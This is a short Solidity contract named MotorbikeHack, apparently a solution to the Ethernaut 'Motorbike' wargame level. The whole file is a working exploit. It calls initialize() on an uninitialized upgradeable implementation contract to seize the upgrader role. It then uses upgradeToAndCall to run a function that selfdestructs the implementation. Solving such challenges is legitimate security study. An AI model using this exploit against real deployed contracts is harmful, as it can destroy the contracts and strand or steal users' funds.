// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IEngine {
    function upgrader() external returns(address);
    function horsePower() external returns(uint);
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
    function initialize() external;
}

contract MotorbikeHack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function hack() external {
        IEngine(target).initialize();
        IEngine(target).upgradeToAndCall(address(this), abi.encodeWithSignature("killed()"));
    }

    function killed() public {
        selfdestruct(payable(msg.sender));
    }
}
